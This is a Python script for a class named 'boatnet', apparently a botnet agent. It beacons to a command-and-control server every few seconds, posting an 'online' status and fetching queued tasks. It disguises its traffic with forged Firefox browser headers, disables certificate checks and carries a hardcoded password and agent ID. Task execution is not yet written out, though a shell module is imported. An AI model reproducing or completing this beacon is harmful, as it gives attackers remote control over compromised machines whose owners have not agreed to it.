import requests
import time
import urllib3
import secrets
import json

from shell import shell

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class boatnet:
    def __init__(self) -> None:
        # Changeables
        self.url = 'https://127.0.0.1:8080'
        self.interval = 3
        self.password = 'cocks123'
        self.agent_id = '2a5e287da9c5955e8188739c33e1d6adbc4dcd236c5068325abe4407675470a1'
        
        
        # Don't change
        self.session = requests.Session()
        
        self.session.headers.update(
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-CA,en-US;q=0.7,en;q=0.3',
                'Connection': 'keep-alive',
                'Authorization': self.password,
                'X-Agent-ID': self.agent_id,
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',

            }
        )
        
        while True:
            time.sleep(self.interval)
            
            self.report()
            self.processCommands()
            
    def processCommands(self):
        self.commandResponse = self.session.get(
            f'{self.url}/agent/task',
            verify=False,
        )
        
        print(self.commandResponse.text)
        
        self.commands = self.commandResponse.json()
        
        for command in self.commands['tasks']:
            print(command['task'])
            
        
    def report(self):
        self.reportResponse = self.session.post(
            f'{self.url}/agent/report',
            json={
                'status': 'online',
            },
            verify=False
        )
        
        print(self.reportResponse.text)
    
if __name__ == "__main__":
    boatnet()